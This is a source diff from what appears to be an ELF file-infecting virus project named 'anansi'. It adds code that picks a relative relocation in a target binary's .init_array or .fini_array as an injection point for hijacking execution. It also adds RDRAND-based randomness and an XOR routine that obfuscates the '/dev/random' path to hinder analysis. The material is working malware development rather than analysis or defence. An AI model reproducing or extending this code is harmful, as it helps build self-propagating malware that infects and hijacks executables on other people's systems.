@@ -36,6 +36,10 @@
 	#define MAX_TARGET 3
 #endif
 
+//misc macros
+#define RDRAND_BIT (1 << 30)
+#define SLASH_DEV_RANDOM ".edw.s`oenl"
+
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
@@ -65,6 +69,10 @@ extern unsigned long real_start;
 // functions unique to anansi
 int dispatch_infection(Elfbin *target);
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
+bool within_section(Elfbin *target, char *section, uint64_t addr);
+bool check_cpu_for_rdrand();
+unsigned int get_random_int();
+void decrypt_xor(char *encrypted_str, char *decrypted_str);
 unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size);
 void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
 char *create_full_path(char *directory, char *filename);
@@ -82,7 +90,6 @@ bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
 /* vx-mechanics functions and global vars*/
 void end_code();
 unsigned long get_eip();
-
 extern unsigned long real_start;
 extern unsigned long end_vx;
 extern unsigned long foobar;
@@ -235,11 +242,15 @@ clean_up:
 
 int dispatch_infection(Elfbin *target)
 {
-	Elf64_Rela r;
+	Elf64_Rela desired_relocation;
 #ifdef DEBUG
 	anansi_printf("Viable target: %s\n", target->f_path);
 #endif
-	has_R_X86_64_RELATIVE(target, &r);
+	if(has_R_X86_64_RELATIVE(target, &desired_relocation)) {
+#ifdef DEBUG
+		anansi_printf("R_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
+#endif
+	}
 
 	return 0;
 }
@@ -249,7 +260,7 @@ int dispatch_infection(Elfbin *target)
  * libc and ld-linux shared objects should not contain this type.
  */
 
-bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *s)
+bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 {
 	int p_entry;
 
@@ -266,9 +277,7 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *s)
 	Elf64_Addr rela_offset = 0;
 	Elf64_Xword rela_sz, rela_ent_size;
 
-	Elf64_Rela *relocations;
-
-	Elf64_Word rela_size = 0, rela_count = 0;
+	Elf64_Word rela_count = 0;
 	for(p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
 		if(target->phdr[p_entry].p_type == PT_DYNAMIC) {
 			found_dynamic = true;
@@ -298,17 +307,119 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *s)
 
 	rela_count = rela_sz / rela_ent_size;
 	reloc_entry = (Elf64_Rela*)(target->read_only_mem + rela_offset);
+	char *random_section = get_random_int() % 2 ? ".init_array" : ".fini_array";
+
 	for(int r = 0; r <= rela_count; r++) {
 		if(reloc_entry[r].r_info == R_X86_64_RELATIVE) {
-#ifdef DEBUG
-			anansi_printf("R_X86_64_RELATIVE offset @ %lx\n", reloc_entry[r].r_offset);
-			anansi_printf("R_X86_64_RELATIVE addend @ %lx\n", reloc_entry[r].r_addend);
-#endif
+			if(within_section(target, random_section, reloc_entry[r].r_offset)) {
+				desired_reloc->r_offset = reloc_entry[r].r_offset;
+				desired_reloc->r_info = reloc_entry[r].r_info;
+				desired_reloc->r_addend = reloc_entry[r].r_addend;
+				return true;
+			}
+		}
+	}
+	return false;
+}
+
+bool within_section(Elfbin *target, char *section, uint64_t addr)
+{
+	uint64_t end_addr, start_addr;
+	int s_index = target->ehdr->e_shstrndx;
+	Elf64_Shdr *strtab_section = &target->shdr[s_index];
+	uint8_t *strtab = (uint8_t *)(target->read_only_mem + strtab_section->sh_offset);
+
+	for(int i = 0; i < target->ehdr->e_shnum; i++) {
+		if(!anansi_strncmp(&strtab[target->shdr[i].sh_name], section, anansi_strlen(section))) {
+			start_addr = target->shdr[i].sh_addr;
+			end_addr = target->shdr[i].sh_addr + target->shdr[i].sh_size;
+			return (addr >= start_addr) && (addr <= end_addr);
+		}
+	}
+	return false;
+}
+
+bool check_cpu_for_rdrand()
+{
+	int ecx;
+
+	__asm__ __volatile__(
+			"movl $1, %%eax\n"
+			"cpuid\n"
+			"movl %%ecx, %0"
+			: "=g" (ecx)
+			: \
+			: "%eax", "%ebx", "%ecx", "%edx"
+			);
+
+	return (ecx & RDRAND_BIT) == RDRAND_BIT;
+}
+
+unsigned int get_random_int()
+{
+	char *dev_slash_random = NULL;
+	static bool cpu_supports_rdrand = false;
+	unsigned int r_integer = 0;
+	uint8_t err;
+
+	int max_reads = 5;
+	int fd = -1;
+	size_t s_len;
+
+	if(!cpu_supports_rdrand)
+		if(check_cpu_for_rdrand())
+			cpu_supports_rdrand = true;
+
+	if(cpu_supports_rdrand) {
+		while(max_reads--) {
+			__asm__ __volatile__ (
+					"rdrand %%eax\n"
+					"setc %1\n"
+					"movl %%eax, %0\n"
+					: "=g" (r_integer), "=g" (err)
+					: \
+					: "%eax"
+					);
+			if(err == 1)
+				break;
 		}
 	}
 
+	/* We've either exhausted max_reads or the cpu doesn't support rdrand, */
+	/* in either case we will use another src of entropy */
+	if(max_reads == 0 || !cpu_supports_rdrand) {
+		s_len = anansi_strlen(SLASH_DEV_RANDOM);
+		dev_slash_random = anansi_malloc(s_len); //TODO: failpoint
+		if(dev_slash_random == NULL)
+			goto clean_up;
+
+		decrypt_xor(SLASH_DEV_RANDOM, dev_slash_random);
+		fd = anansi_open(dev_slash_random, O_RDONLY, 0);
+		if(fd < 0)
+			goto clean_up;
+
+		if(anansi_read(fd, &r_integer, sizeof(unsigned int)) < 0)
+			goto clean_up;
+	}
+
+	clean_up:
+	if(dev_slash_random != NULL)
+		anansi_munmap(SLASH_DEV_RANDOM, s_len);
+	if(fd > 0)
+		anansi_close(fd);
+
+	return r_integer;
 }
 
+void decrypt_xor(char *encrypted_str, char *decrypted_str)
+{
+	char *d_ptr = decrypted_str;;
+	int key = 0x890c6d01;
+
+	while(*encrypted_str != '\0')
+		*d_ptr++ = *encrypted_str++ ^ key;
+	*d_ptr = '\0';
+}
 
 unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size)
 {
